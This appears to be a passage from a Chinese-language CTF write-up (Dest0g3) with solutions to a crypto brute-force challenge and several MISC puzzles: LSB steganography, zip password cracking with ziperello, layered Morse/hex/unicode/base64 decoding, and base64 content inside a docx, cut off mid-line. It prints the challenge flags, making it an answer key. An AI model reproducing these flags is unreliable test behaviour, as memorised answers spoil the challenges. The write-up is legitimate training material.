<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-_&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.product(table,table,table,table):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span><br><span class="hljs-comment"># Dest0g3&#123;d2a4d1af-8a80-8794-99ac-635f89494cac&#125;</span><br></code></pre></td></tr></table></figure>
<p>花的时间也不算太长，大概5分钟。</p>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1>
<h2 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h2>
<p>StegoSolve看一遍，图像上没有什么值得注意的地方。LSB可以看到一个密码。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0617373776f7264</span> <span class="hljs-number">20666</span>f72207a6970  Password  for zip<br><span class="hljs-attribute">3a5765616b5f5061</span> <span class="hljs-number">733577307264</span>ffff  :Weak_Pa s5w0rd..<br></code></pre></td></tr></table></figure>
<p>foremost分离出一个压缩包,用上述密码进行解压得到flag。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># Dest0g3&#123;<span class="hljs-number">2908</span>C1AA-B2C1-B<span class="hljs-number">8E6-89D1</span>-<span class="hljs-number">21</span>B<span class="hljs-number">97D778603</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h2>
<p>下载得到一个压缩包，没有其他信息了。密码找了一圈没有找到。采取爆破尝试。ziperello爆破6位数字密码得到密码为：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">100861<br></code></pre></td></tr></table></figure>
<p>打开文本文件得到摩斯电码:</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <br></code></pre></td></tr></table></figure>
<p>解码得到：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034645</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036625</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033305</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036635</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">7530303434</span><br></code></pre></td></tr></table></figure>
<p>十六进制转换为字符串得到：</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;<span class="hljs-symbol">\\</span>u0052<span class="hljs-symbol">\\</span>u0047<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0064<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0042<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u004d<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0074<span class="hljs-symbol">\\</span>u0045<span class="hljs-symbol">\\</span>u005a<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u006b<span class="hljs-symbol">\\</span>u0061<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0035<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u0032<span class="hljs-symbol">\\</span>u0055<span class="hljs-symbol">\\</span>u0030<span class="hljs-symbol">\\</span>u0063<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u006c<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u004e<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u0051<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044&#x27;<br></code></pre></td></tr></table></figure>
<p>unicode编码转换：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">RGVzdDB<span class="hljs-symbol">nM3</span>tEZW<span class="hljs-number">9</span>kaW<span class="hljs-number">5</span><span class="hljs-symbol">nXzFzX2</span>U<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lf<span class="hljs-symbol">NF9</span>VfQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure>
<p>得到以上结果，一开始以为这个是凯撒密码，但是转了一轮没有正确的。后面尝试用base64去解，发现成功了。主要是后面的%误导了。但现在想一下%3D不就是URL编码的=吗。</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Dest<span class="hljs-number">0</span><span class="hljs-name">g3</span>&#123;Deodi<span class="hljs-symbol">ng_1</span>s_e<span class="hljs-number">4</span>sy_<span class="hljs-number">4</span>_U&#125;<br></code></pre></td></tr></table></figure>
<h2 id="你知道js吗"><a class="markdownIt-Anchor" href="#你知道js吗"></a> 你知道js吗</h2>
<p>文件下载下来没有后缀名，二进制打开看到有个pk，就当压缩包解了。但是打开之后这些文件像是docx。所以后缀名变为docx打开。里面都是写图形字符。不知道是什么。</p>
<p>在解压的文件中找到./word/document.xml里面有一大段base64编码的内容，这个应该是我们之前看到的文档内容。提出来一段看看。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PD<span class="hljs-number">94</span>bWwgdmVyc<span class="hljs-number">2</span>lvbj<span class="hljs-number">0</span>iMS<span class="hljs-number">4</span>wIiBlbmNvZGluZz<span class="hljs-number">0</span>iVVRGLTgiIHN<span class="hljs-number">0</span>YW<span class="hljs-number">5</span>kYWxvbmU<span class="hljs-number">9</span>InllcyI/Pgo<span class="hljs-number">8</span>YXNzZW<span class="hljs-number">1</span>ibHkgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYxIiBtYW<span class="hljs-number">5</span>pZmVzdFZlcnNpb<span class="hljs-number">249</span>IjEuMCI+Cjx<span class="hljs-number">0</span>cnVzdEluZm<span class="hljs-number">8</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICAgICAgPHJlcXVlc<span class="hljs-number">3</span>RlZEV<span class="hljs-number">4</span>ZWN<span class="hljs-number">1</span>dGlvbkxldmVsIGxldmVsPSJhc<span class="hljs-number">0</span>ludm<span class="hljs-number">9</span>rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPgo<span class="hljs-number">8</span>YXBwbGljYXRpb<span class="hljs-number">24</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICA<span class="hljs-number">8</span>ZHBpQXdhcmVuZXNzIHhtbG<span class="hljs-number">5</span>zPSJodHRwOi<span class="hljs-number">8</span>vc<span class="hljs-number">2</span>NoZW<span class="hljs-number">1</span>hcy<span class="hljs-number">5</span>taWNyb<span class="hljs-number">3</span>NvZnQuY<span class="hljs-number">29</span>tL<span class="hljs-number">1</span>NNSS<span class="hljs-number">8</span>yMDE<span class="hljs-number">2</span>L<span class="hljs-number">1</span>dpbmRvd<span class="hljs-number">3</span>NTZXR<span class="hljs-number">0</span>aW<span class="hljs-number">5</span>ncyI+RG<span class="hljs-number">8</span>geW<span class="hljs-number">91</span>IGtub<span class="hljs-number">3</span>cganM<span class="hljs-number">8</span>L<span class="hljs-number">2</span>RwaUF<span class="hljs-number">3</span>YXJlbmVzcz<span class="hljs-number">4</span>KPHNjcmlwdCBsYW<span class="hljs-number">5</span>ndWFnZT<span class="hljs-number">0</span>iamF<span class="hljs-number">2</span>YXNjcmlwdCI+ZG<span class="hljs-number">9</span>jdW<span class="hljs-number">1</span>lbnQud<span class="hljs-number">3</span>JpdGUodW<span class="hljs-number">5</span>lc<span class="hljs-number">2</span>NhcGUoJyUzQ<span class="hljs-number">2</span>h<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>Nib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>JTNFJTBBJTBBJTNDJTIxRE<span class="hljs-number">9</span>DVFlQRSUyMGh<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>NodG<span 